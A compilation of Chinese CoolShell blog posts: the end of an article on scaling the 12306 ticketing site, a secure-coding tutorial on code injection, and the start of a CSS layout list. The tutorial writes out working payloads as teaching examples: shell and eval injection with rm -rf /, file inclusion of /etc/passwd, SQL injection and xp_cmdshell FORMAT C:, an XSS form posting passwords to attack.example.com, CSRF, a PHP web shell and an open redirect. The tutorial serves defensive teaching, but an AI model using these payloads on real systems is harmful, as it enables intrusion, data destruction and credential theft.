* **数据一致性才是真正的性能瓶颈** 。有 人说nginx可以搞定每秒10万的静态请求，我不怀疑。但这只是静态请求，理论值，只要带宽、I/O够强，服务器计算能力够，并支持的并发连接数顶得住10万TCP链接的建立 的话，那没有问题。但在数据一致性面前，这10万就完完全全成了一个可望不可及的理论值了。我说那么多，我只是想从业务上告诉大家，我们需要从业务上真正了解春运铁路订票这样业务的变态之处。#### 前端性能优化技术要解决性能的问题，有很多种常用的方法，我在下面列举一下，我相信12306这个网站使用下面的这些技术会让其性能有质的飞跃。##### 一、前端负载均衡通过DNS的负载均衡器（一般在路由器上根据路由的负载重定向）可以把用户的访问均匀地分散在多个Web服务器上。这样可以减少Web服务器的请求负载。因为http的请求都是短作业，所以，可以通过很简单的负载均衡器来完成这一功能。最好是有CDN网络让用户连接与其最近的服务器（CDN通常伴随着分布式存储）。（关于负载均衡更为详细的说明见“后端的负载均衡”）##### 二、减少前端链接数我看了一下12306.cn，打开主页需要建60多个HTTP连接，车票预订页面则有70多个HTTP请求，现在的浏览器都是并发请求的（当然，浏览器的一个页面的并发数是有限的，但是你挡不住用户开多个页面，而且，后端服务器TCP链接在前端断开始，还不会马上释放或重要）。所以，只要有100万个用户，就有可能会有6000万个链接（访问第一次后有了浏览器端的cache，这个数会下来，就算只有20%也是百万级的链接数），太多了。一个登录查询页面就好了。把js打成一个文件，把css也打成一个文件，把图标也打成一个文件，用css分块展示。把链接数减到最低。
##### 三、减少网页大小增加带宽这个世界不是哪个公司都敢做图片服务的，因为图片太耗带宽了。现在宽带时代很难有人能体会到当拨号时代做个图页都不敢用图片的情形（现在在手机端浏览也是这个情形）。我查看了一下12306首页的需要下载的总文件大小大约在900KB左右，如果你访问过了，浏览器会帮你缓存很多，只需下载10K左右的文件。但是我们可以想像一个极端一点的案例，1百万用户同时访问，且都是第一次访问，每人下载量需要1M，如果需要在120秒内返回，那么就需要，1M * 1M /120 * 8 = 66Gbps的带宽。很惊人吧。所以，我估计在当天，12306的阻塞基本上应该是网络带宽，所以，你可能看到的是没有响应。后面随着浏览器的缓存帮助12306减少很多带宽占用，于是负载一下就到了后端，后端的数据处理瓶颈一下就出来。于是你会看到很多http 500之类的错误。这说明后端服务器垮了。##### 四、前端页面静态化静态化一些不常变的页面和数据，并gzip一下。 ~~还有一个变态的方法是把这些静态页面放在/dev/shm下，这个目录就是内存，直接从内存中把文件读出来返回，这样可以减少昂贵的磁盘I/O~~ 。使用nginx的sendfile功能可以让这些静态文件直接在内核心态交换，可以极大增加性能。
##### 五、优化查询很多人查询都是在查一样的，完全可以用反向代理合并这些并发的相同的查询。这样的技术主要用查询结果缓存来实现，第一次查询走数据库获得数据，并把数据放到缓存，后面的查询统统直接访问高速缓存。为每个查询做Hash，使用NoSQL的技术可以完成这个优化。（这个技术也可以用做静态页面）对于火车票量的查询，个人觉得不要显示数字，就显示一个“有”或“无”就好了，这样可以大大简化系统复杂度，并提升性能。把查询对数据库的负载分出去，从而让数据库可以更好地为下单的人服务。##### 六、缓存的问题缓存可以用来缓存动态页面，也可以用来缓存查询的数据。缓存通常有那么几个问题：1）缓存的更新。也叫缓存和数据库的同步。有这么几种方法，一是缓存time out，让缓存失效，重查，二是，由后端通知更新，一量后端发生变化，通知前端更新。前者实现起来比较简单，但实时性不高，后者实现起来比较复杂 ，但实时性高。2）缓存的换页。内存可能不够，所以，需要把一些不活跃的数据换出内存，这个和操作系统的内存换页和交换内存很相似。FIFO、LRU、LFU都是比较经典的换页算法。相关内容参看Wikipeida的缓存算法。
3）缓存的重建和持久化。缓存在内存，系统总要维护，所以，缓存就会丢失，如果缓存没了，就需要重建，如果数据量很大，缓存重建的过程会很慢，这会影响生产环境，所以，缓存的持久化也是需要考虑的。诸多强大的NoSQL都很好支持了上述三大缓存的问题。#### 后端性能优化技术前面讨论了前端性能的优化技术，于是前端可能就不是瓶颈问题了。那么性能问题就会到后端数据上来了。下面说几个后端常见的性能优化技术。##### 一、数据冗余关于数据冗余，也就是说，把我们的数据库的数据冗余处理，也就是减少表连接这样的开销比较大的操作，但这样会牺牲数据的一致性。风险比较大。很多人把NoSQL用做数据，快是快了，因为数据冗余了，但这对数据一致性有大的风险。这需要根据不同的业务进行分析和处理。（注意：用关系型数据库很容易移植到NoSQL上，但是反过来从NoSQL到关系型就难了）##### 二、数据镜像几乎所有主流的数据库都支持镜像，也就是replication。数据库的镜像带来的好处就是可以做负载均衡。把一台数据库的负载均分到多台上，同时又保证了数据一致性（Oracle的SCN）。最重要的是，这样还可以有高可用性，一台废了，还有另一台在服务。
数据镜像的数据一致性可能是个复杂的问题，所以我们要在单条数据上进行数据分区，也就是说，把一个畅销商品的库存均分到不同的服务器上，如，一个畅销商品有1万的库存，我们可以设置10台服务器，每台服务器上有1000个库存，这就好像B2C的仓库一样。##### 三、数据分区数据镜像不能解决的一个问题就是数据表里的记录太多，导致数据库操作太慢。所以，把数据分区。数据分区有很多种做法，一般来说有下面这几种：1）把数据把某种逻辑来分类。比如火车票的订票系统可以按各铁路局来分，可按各种车型分，可以按始发站分，可以按目的地分……，反正就是把一张表拆成多张有一样的字段但是不同种类的表，这样，这些表就可以存在不同的机器上以达到分担负载的目的。2）把数据按字段分，也就是竖着分表。比如把一些不经常改的数据放在一个表里，经常改的数据放在另外多个表里。把一张表变成1对1的关系，这样，你可以减少表的字段个数，同样可以提升一定的性能。另外，字段多会造成一条记录的存储会被放到不同的页表里，这对于读写性能都有问题。但这样一来会有很多复杂的控制。3）平均分表。因为第一种方法是并不一定平均分均，可能某个种类的数据还是很多。所以，也有采用平均分配的方式，通过主键ID的范围来分表。
4）同一数据分区。这个在上面数据镜像提过。也就是把同一商品的库存值分到不同的服务器上，比如有10000个库存，可以分到10台服务器上，一台上有1000个库存。然后负载均衡。这三种分区都有好有坏。最常用的还是第一种。数据一旦分区，你就需要有一个或是多个调度来让你的前端程序知道去哪里找数据。 **把火车票的数据分区，并放在各个省市，会对12306这个系统有非常有意义的质的性能的提高** 。##### 四、后端系统负载均衡前面说了数据分区，数据分区可以在一定程度上减轻负载，但是无法减轻热销商品的负载，对于火车票来说，可以认为是大城市的某些主干线上的车票。这就需要使用数据镜像来减轻负载。使用数据镜像，你必然要使用负载均衡，在后端，我们可能很难使用像路由器上的负载均衡器，因为那是均衡流量的，因为流量并不代表服务器的繁忙程度。因此，我们需要一个任务分配系统，其还能监控各个服务器的负载情况。任务分配服务器有一些难点：* 负载情况比较复杂。什么叫忙？是CPU高？还是磁盘I/O高？还是内存使用高？还是并发高？还是内存换页率高？你可能需要全部都要考虑。这些信息要发送给那个任务分配器上，由任务分配器挑选一台负载最轻的服务器来处理。
* 任务分配服务器上需要对任务队列，不能丢任务啊，所以还需要持久化。并且可以以批量的方式把任务分配给计算服务器。* 任务分配服务器死了怎么办？这里需要一些如Live-Standby或是failover等高可用性的技术。我们还需要注意那些持久化了的任务的队列如何转移到别的服务器上的问题。我看到有很多系统都用静态的方式来分配，有的用hash，有的就简单地轮流分析。这些都不够好，一个是不能完美地负载均衡，另一个静态的方法的致命缺陷是，如果有一台计算服务器死机了，或是我们需要加入新的服务器，对于我们的分配器来说，都需要知道的。另外，还要重算哈希（一致性hash可以部分解决这个问题）。还有一种方法是使用抢占式的方式进行负载均衡，由下游的计算服务器去任务服务器上拿任务。让这些计算服务器自己决定自己是否要任务。这样的好处是可以简化系统的复杂度，而且还可以任意实时地减少或增加计算服务器。但是唯一不好的就是，如果有一些任务只能在某种服务器上处理，这可能会引入一些复杂度。不过总体来说，这种方法可能是比较好的负载均衡。##### 五、异步、 throttle 和 批量处理异步、throttle（节流阀） 和批量处理都需要对并发请求数做队列处理的。
* 异步在业务上一般来说就是收集请求，然后延时处理。在技术上就是可以把各个处理程序做成并行的，也就可以水平扩展了。但是异步的技术问题大概有这些，a）被调用方的结果返回，会涉及进程线程间通信的问题。b）如果程序需要回滚，回滚会有点复杂。c）异步通常都会伴随多线程多进程，并发的控制也相对麻烦一些。d）很多异步系统都用消息机制，消息的丢失和乱序也会是比较复杂的问题。* throttle 技术其实并不提升性能，这个技术主要是防止系统被超过自己不能处理的流量给搞垮了，这其实是个保护机制。使用throttle技术一般来说是对于一些自己无法控制的系统，比如，和你网站对接的银行系统。* 批量处理的技术，是把一堆基本相同的请求批量处理。比如，大家同时购买同一个商品，没有必要你买一个我就写一次数据库，完全可以收集到一定数量的请求，一次操作。这个技术可以用作很多方面。比如节省网络带宽，我们都知道网络上的MTU（最大传输单元），以态网是1500字节，光纤可以达到4000多个字节，如果你的一个网络包没有放满这个MTU，那就是在浪费网络带宽，因为网卡的驱动程序只有一块一块地读效率才会高。因此，网络发包时，我们需要收集到足够多的信息后再做网络I/O，这也是一种批量处理的方式。批量处理的敌人是流量低，所以，批量处理的系统一般都会设置上两个阀值，一个是作业量，另一个是timeout，只要有一个条件满足，就会开始提交处理。
所以， **只要是异步，一般都会有throttle机制，一般都会有队列来排队，有队列，就会有持久化，而系统一般都会使用批量的方式来处理** 。云风同学设计的“排队系统” 就是这个技术。这和电子商务的订单系统很相似，就是说，我的系统收到了你的购票下单请求，但是我还没有真正处理，我的系统会跟据我自己的处理能力来throttle住这些大量的请求，并一点一点地处理。一旦处理完成，我就可以发邮件或短信告诉用户你来可以真正购票了。在这里，我想通过业务和用户需求方面讨论一下云风同学的这个排队系统，因为其从技术上看似解决了这个问题，但是从业务和用户需求上来说可能还是有一些值得我们去深入思考的地方：1） **队列的DoS攻击** 。首先，我们思考一下，这个队是个单纯地排队的吗？这样做还不够好，因为这样我们不能杜绝黄牛，而且单纯的ticket_id很容易发生DoS攻击，比如，我发起N个 ticket_id，进入购票流程后，我不买，我就耗你半个小时，很容易我就可以让想买票的人几天都买不到票。有人说，用户应该要用身份证来排队， 这样在购买里就必需要用这个身份证来买，但这也还不能杜绝黄牛排队或是号贩子。因为他们可以注册N个帐号来排队，但就是不买。黄牛这些人这个时候只需要干一个事，把网站搞得正常人不能访问，让用户只能通过他们来买。
2） **对列的一致性** ？对这个队列的操作是不是需要锁？只要有锁，性能一定上不去。试想，100万个人同时要求你来分配位置号，这个队列将会成为性能瓶颈。你一定没有数据库实现得性能好，所以，可能比现在还差。 **抢数据库和抢队列本质上是一样的** 。3） **队列的等待时间** 。购票时间半小时够不够？多不多？要是那时用户正好不能上网呢？如果时间短了，用户不够时间操作也会抱怨，如果时间长了，后面在排队的那些人也会抱怨。这个方法可能在实际操作上会有很多问题。另外，半个小时太长了，这完全不现实，我们用15分钟来举例：有1千万用户，每一个时刻只能放进去1万个，这1万个用户需要15分钟完成所有操作，那么，这1千万用户全部处理完，需要1000*15m = 250小时，10天半，火车早开了。（我并非信口开河，根据铁道部专家的说明：这几天，平均一天下单100万，所以，处理1000万的用户需要十天。这个计算可能有点简单了，我只是想说， **在这样低负载的系统下用排队可能都不能解决业务问题** ）4） **队列的分布式** 。这个排队系统只有一个队列好吗？还不足够好。因为，如果你放进去的可以购票的人如果在买同一个车次的同样的类型的票（比如某动车卧铺），还是等于在抢票，也就是说系统的负载还是会有可能集中到其中某台服务器上。因此，最好的方法是根据用户的需求——提供出发地和目的地，来对用户进行排队。而这样一来，队列也就可以是多个，只要是多个队列，就可以水平扩展了。这样可以解决性能问题，但是没有解决用户长时间排队的问题。
我觉得完全可以向网上购物学习。 **在排队（下单）的时候，收集好用户的信息和想要买的票，并允许用户设置购票的优先级，比如，A车次卧铺买 不到就买 B车次的卧铺，如果还买不到就买硬座等等，然后用户把所需的钱先充值好，接下来就是系统完全自动地异步处理订单** 。成功不成功都发短信或邮件通知用户。这样，系统不仅可以省去那半个小时的用户交互时间，自动化加快处理，还可以合并相同购票请求的人，进行批处理（减少数据库的操作次数）。 **这种方法最妙的事是可以知道这些排队用户的需求，不但可以优化用户的队列，把用户分布到不同的队列，还可以像亚马逊的心愿单一样，通过一些计算就可以让铁道部做车次统筹安排和调整** （最后，排队系统（下单系统）还是要保存在数据库里的或做持久化，不能只放在内存中，不然机器一down，就等着被骂吧）。#### 小结写了那么多，我小结一下：0） **无论你怎么设计，你的系统一定要能容易地水平扩展** 。也就是说，你的整个数据流中，所有的环节都要能够水平扩展。这样，当你的系统有性能问题时，“加30倍的服务器”才不会被人讥笑。1） **上述的技术不是一朝一夕能搞定的，没有长期的积累，基本无望** 。我们可以看到，无论你用哪种都会引发一些复杂性，设计总是在做一种权衡。
2）集中式的卖票很难搞定，使用上述的技术可以让订票系统能有几佰倍的性能提升。而在 **各个省市建分站，分开卖票，是能让现有系统性能有质的提升的最好方法** 。3） **春运前夕抢票且票量供远小于求这种业务模式是相当变态的** ，让几千万甚至上亿的人在某个早晨的8点钟同时登录同时抢票的这种业务模式是变态中的变态。业务形态的变态决定了无论他们怎么办干一定会被骂。4） **为了那么一两个星期而搞那么大的系统** ，而其它时间都在闲着，有些可惜了，这也就是铁路才干得出来这样的事了。_**更新2012年9月27日**_**Alexa 统计的12306的PV** （注：Alexa的PV定义是：一个用户在一天内对一个页面的多次点击只算一次）（ **本文转载时请注明作者和出处，请勿于记商业目的** ）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 程序员疫苗：代码注入作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn几个月在我的微博上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。
我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。目录* Shell注入   * SQL注入   * 跨网站脚本注 入   * 上传文件   * URL跳转#### Shell注入我们先来看一段perl的代码：[perl]use CGI qw(:standard);   $name = param(‘name’);   $nslookup = "/path/to/nslookup";   print header;   if (open($fh, "$nslookup $name|")) {   while (<$fh>) {   print escapeHTML($_);   print "<br>\n";   }   close($fh);   }[/perl]如果用户输入的参数是：`coolshell.cn%20%3B%20/bin/ls%20-l`那么，这段perl的程序就成了：`/path/to/nslookup coolshell.cn ; /bin/ls -l`我们再来看一段PHP的程序：
$myvar = 'somevalue';     $x = $_GET['arg'];     eval('$myvar = ' . $x . ';');“`eval`“的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果”arg”如果被设成”`10; system('rm -rf /')`“，后面的”`system('rm -rf /')`“代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“一个空格引发的悲剧”）再来看一个PHP的代码如果攻击者在查询字符串中给定”isadmin=1″，那$isadmin将会被设为值 “1”，然后攻击值就取得了网站应用的admin权限了。再来看一个PHP的示例：$action = 'login';     if (__isset( $_GET['act'] ) )     $action = $_GET['act'];     require( $action . '.php' );这个代码相当危险，攻击者有可能可以干这些事：* `/test.php?act= **http://evil/exploit**` – 注入远程机器上有漏洞的文件。   * `/test.php?act= **/home/www/bbs/upload/exploit**` – 从一个已经上载、叫做exploit.php文件运行其代码。   * `/test.php?act= **../../../../etc/passwd%00**` – 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除`.php`扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值”magic_quotes_gpc = On”可以终止这种攻击)
这样的示例有很多，只要你的程序有诸如：`system()`、`StartProcess()`、`java.lang.Runtime.exec()`、`System.Diagnostics.Process.Start()`以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。PHP提供`escapeshellarg()`和`escapeshellcmd()`以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。#### SQL注入SQL injection，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：1. 在应用程序中使用字符串联结方式组合SQL指令（如：引号没有转义）。   2. 在应用程序链接数据库时使用权限过大的帐户（如：很多开发人员都喜欢用sa（最高权限的系统管理员帐户）连接Microsoft SQL Server数据库）。   3. 在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）   4. 过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。
例程：某个网站的登录验证的SQL查询代码为strSQL = "SELECT * FROM users     WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"用户在登录时恶意输入如下的的用户名和口令：`userName = "' OR '1'='1";``passWord = "' OR '1'='1";`此时，将导致原本的SQL字符串被解析为：strSQL = "SELECT * FROM users     WHERE (name = '' OR '1'='1') and (pw = '' OR '1'='1');"也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。`strSQL = "SELECT * FROM users;"`这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：`username= "' ; DELETE FROM users; --";`这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。**所以SQL注入攻击被俗称为黑客的填空游戏** 。你是否还记得酷壳这篇文章里的SQL注入？
当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：* 盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：我前两天在微信上亲身经历）。* 取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。* 在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。* 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家在不站点上使用不同的口令，甚至不同的用户信息的原因）**如何避免**
* 在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。 **如果可能应该过滤以下字符：分号“;”，两个减号“–”，单引号“’”，注释“/* … */”** 。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）* 更换危险字符。例如在PHP通过`addslashes()`函数保护SQL注入。* 限制用户输入的长度，限制用户输入的取值范围。* 为当前应用建立权限比较小的数据库用户，这样不会导致数据库管理员丢失。* 把数据库操作封装成一个Service，对于敏感数据，对于每个客户端的IP，在一定时间内每次只返回一条记录。这样可以避免被拖库。######## 跨网站脚本注 入**跨网站脚本** （ **Cross-site** scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。
假如我们有这样一段PHP的代码：$username = $_GET['username'];     echo '<div> Welcome, ' . $username . '</div>';那么我们可以这样来注入：http://trustedSite.example.com/welcome.php?username=<Script Language=”Javascript”>alert(“You’ve been attacked!”);</Script>甚至这样：http://trustedSite.example.com/welcome.php?username=<div id=”stealPassword”>Please Login:<form name=”input” action=”http://attack.example.com/stealPassword.php” method=”post”>Username: <input type=”text” name=”username” /><br/>Password: <input type=”password” name=”password” /><input type=”submit” value=”Login” /></form></div>
这会让网页显示以下内容：<div class="header"> Welcome,     <div id="stealPassword">Please Login:     <form name="input" action="attack.example.com/stealPassword.php" method="post">     Username: <input type="text" name="username" />     <br/>     Password: <input type="password" name="password" />     <input type="submit" value="Login" />     </form>     </div>     </div>注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：trustedSite.example.com/welcome.php?username=<script+type=”text/javascript”>document.write(‘\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D’);</script>**XSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）** 。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《新浪微博的XSS攻击》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《腾讯微博的XSS攻击》。XSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。不要以为XSS攻击是我们的程序没有写好，有时候，我们会引用别人站点上的js文件，比如：放一个天气预报的小Widget的js，或是一个流量监控，或是一段广告的js文件。你不知道这些东西是不是有问题，如果有恶意的话，这就是你自己主动注入攻击代码了。
**另外，XSS攻击有一部分是和浏览器有关的。** 比如，如下的一些例子，你可能从来都没有想过吧？（ **更多的例子可以参看酷壳很早以前的这篇文章《浏览器HTML安全列表》**）<table background=”javascript:alert(1)”><meta charset=”mac-farsi”>¼script¾alert(1)¼/script¾<img src=”javascript:alert(1)”>XSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）于是，如果我在A站点内的某个贴子内注入这么一段代码：`<img src="http://bank.example.com/transfer?account=XXX&amount=1000000&for=haoel">`很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。**如何避免**
要防止XSS攻击，一般来说有下面几种手段：* 严格限制用户的输入。最好不要让用户输入带标签的内容。最好不要让用户使用一些所见即所得的HTML编辑器。* 严格过滤用户的输入。如：      * PHP的`htmlentities()或是htmlspecialchars()或是strip_tags()`。     * Python的`cgi.escape()`     * ASP的`Server.HTMLEncode()`。     * Node.js的node-validator。     * Java的xssprotect。* 在一些关键功能，完全不能信任cookie，必需要用户输入口令。如：修改口令，支付，修改电子邮件，查看用户的敏感信息等等。* 限制cookie的过期时间。* 对于CSRF攻击，一是需要检查http的reference header。二是不要使用GET方法来改变数据，三是对于要提交的表单，后台动态生成一个随机的token，这个token是攻击者很难伪造的。（对于token的生成，建议找一些成熟的lib库）另外，你可能觉得网站在处理用户的表单提交就行了，其实不是， **想一想那些Web Mail，我可以通过别的服务器向被攻击用户发送有JS代码、图片、Flash的邮件到你的邮箱，你打开一看，你就中招了** 。所以，WebMail一般都禁止显示图片和附件，这些都很危险，只有你完全了解来源的情况下才能打开。 **电子邮件的SMTP协议太差了，基本上无法校验其它邮件服务器的可信度，我甚至可以自己建一个本机的邮件服务器，想用谁的邮件地址发信就用谁的邮件地址发信** 。 **所以，我再次真诚地告诉大家，请用gmail邮箱** 。别再跟我说什么QQMail之类的好用了。
#### 上传文件上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。 **试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。**举个例子：<form action="upload_picture.php" method="post" enctype="multipart/form-data">     要上传的文件:     <input type="file" name="filename"/>     <br/>     <input type="submit" name="submit" value="Submit"/>     </form>$target = "pictures/" . basename($_FILES['uploadedfile']['name']);     if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)){     echo "图片文件上传成功";     }else{</div>     echo "图片文件上传失败";     }
假如我上传了一个PHP文件如下：<?php     system($_GET['cmd']);     ?>那么，我就可以通过如下的URL访问攻击你的网站了：`http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l`抵御这样的攻击有两种手段：1）限制上传文件的文件扩展名。2）千万不要使用root或Administrator来运行你的Web应用。#### URL跳转URL跳转很有可能会成为攻击利用的工具。比如下面的PHP代码：$redirect_url = $_GET['url'];     header("Location: " . $redirect_url);这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。`http://bank.example.com/redirect?url=http://attacker.example.net`
这种攻击具有的迷惑性在于，用户看到的http://bank.example.com， **以为是一个合法网站，于是就点了这个链接，结果通过这个合法网站，把用户带到了一个恶意网站，而这个恶意网站上可能把页面做得跟这个合法网站一模一样，你还以为访问的是正确的地方，结果就被钓鱼了** 。解决这个问题很简单，你需要在你的后台判断一下传过来的URL的域名是不是你自己的域名。你可以看看Google和Baidu搜索引擎的链接跳转，百度的跳转链接是被加密过的，而Google的网站链接很长，里面有网站的明文，但是会有几个加密过的参数，如果你把那些参数移除掉，Google会显示一个重定向的提醒页面。（我个人觉得还是Google做得好）（本篇文章结束）这段时间工作和家里的事比较多，所以时间有限，更新不快，而此篇行文比较仓促，欢迎大家补充，并指出我文中的问题。# CSS 布局:40个教程、技巧、例子和最佳实践作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【感谢 Neo 投递本文 – 微博帐号：_锟_ 】**前言：** 布局是WEB开发一个重要的课题，进入XHTML/CSS后，使用TABLE布局的方式逐渐淡出，CSS布局以众多优点成为主流，本文将介绍40个基于CSS的web布局的资源和教程。文章的出处在。文中的不少的例子在一本经典的CSS书籍《CCS: The Missing Manual, 2nd Edition》中都可以找到，据我所知，第二版在中国没有翻译出版。你可以从这里下载英文版（不过需要注册个用户名）
**正文**   **基于CSS的布局** 能提供更灵活布局方式和更强的用户视觉体验。一些重要技巧和关键点可以帮助初学者理解CSS布局的基础和本质。这也是本文成文的原因 ——找到那些完美的布局， **完全灵活的，等高栏** 和工作完美的布局。   因此下面这个列表就是我们整理了网络上关于基于CSS布局的一些技巧，教程和最佳实践的列表。   当然你也可能对下面这些和CSS相关的主题有兴趣：The 7 CSS Hacks that we should use   Using CSS to Do Anything: 50+ Creative Examples and Tutorials   Using CSS to Fix Anything: 20+ Common Bugs and Fixes#### **CSS 布局教程**1-使用CSS完成三栏固定布局结构– 这篇文章解释了如何实现一个基于的HTML/CSS来设计一个简单的带有基本要素（顶部的logo条，导航条，文本区，定义分类的中部栏，右边侧栏插入google的120X600的广告区）的固定三栏页面布局。2-使用CSS设计页面布局– 如何使用CSS文件来为你的站点设计页面布局。
